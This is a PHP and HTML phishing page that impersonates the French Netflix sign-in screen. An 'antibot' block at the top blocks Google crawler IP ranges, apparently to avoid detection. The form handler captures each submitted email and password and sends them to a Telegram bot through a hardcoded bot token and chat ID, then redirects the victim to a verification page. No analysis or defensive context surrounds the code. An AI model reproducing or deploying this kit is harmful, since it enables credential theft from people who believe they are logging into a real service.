
<?php
// Antibot protection
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// List of blocked IPs (simplified version from previous antibot configuration)
$blocked_ips = array(
    '/^64\..*/', '/^66\.102\..*/', '/^66\.249\..*/', '/^72\.14\..*/',
    '/^74\.125\..*/', '/^209\.85\..*/', '/^216\.239\..*/'
);

// Check if IP is blocked
foreach ($blocked_ips as $blocked_ip) {
    if (preg_match($blocked_ip, $ip)) {
        header('HTTP/1.0 403 Forbidden');
        exit('Access denied.');
    }
}


?>

<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    $_SESSION['email'] = $email;
    $_SESSION['password'] = $password;

    $message = "[+]━━━━【🔐 Connexion Netflix】━━━━[+]\n";
    $message .= "Email: $email\n";
    $message .= "Mot de passe: $password\n";
    
    sendToTelegram($message);
    
    header("Location: verif.php?email=" . urlencode($userEmailOrPhone));
    exit();
}

function sendToTelegram($message) {
    $website = "https://api.telegram.org/bot7839515626:AAFb4eae4Z1Qyy3og3TdlHqkjk94eghdO5g/sendMessage";
    $params = [
        'chat_id' => "5196790326",
        'text' => $message,
    ];
    $ch = curl_init($website);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="short icon" href="Netflix_icon.svg-removebg-preview.png">
    <title>Netflix - connexion</title>
</head>
<body>
    <h1 class="logo"><img src="photo_2024-09-22_00-07-17-removebg-preview.png" alt="Logo Netflix"></h1>
    <div class="container">
        <div class="login-container">
            <h1>S'identifier</h1>
            <form id="loginForm" action="index.php" method="POST">
                <input type="text" id="email" name="email" placeholder="E-mail ou numéro de mobile" autocomplete="off"  required>
                <input type="password" name="password" placeholder="Mot de passe" autocomplete="off" required>
                <button type="submit" class="login-btn">S'identifier</button>
            </form>
            <div class="options">
                <input type="checkbox" id="rememberMe">
                <label for="rememberMe">Se souvenir de moi</label><br><br>
                <a href="">Mot de passe oublié ?</a>
            </div>
            <hr>
            <div class="signup">
                Première visite sur Netflix ? <a href="#">Inscrivez-vous.</a>
                <p>Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.</p>
            </div>
        </div>
    </div>

    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-image: url(netflix-octobre-contenus-2022.jpg);
            background-size: cover;
            background-position: center;
        }
        .container {
            display: flex;
            color: rgb(255, 235, 235);
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        h1 img {
            width: 150px;
            padding: 10px 50px;
        }
        .login-container {
            background-color: rgba(0, 0, 0, 0.75);
            padding: 60px 60px;
            border-radius: 8px;
            width: 300px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            border: none;
            outline: none;
        }
        .login-btn {
            background-color: #e50914;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-btn:hover {
            background-color: #f40612;
        }
        .options {
            margin-top: 10px;
        }
        .options a {
            color: #d81111;
            text-decoration: none;
        }
        .options a:hover {
            text-decoration: underline;
        }
        .signup {
            color: #757575;
        }

        /* Media Query for small screens */
        @media (max-width: 600px) {
            body {
                background-color: black;
                background-image: none;
            }

        }
    </style>
</body>
</html>
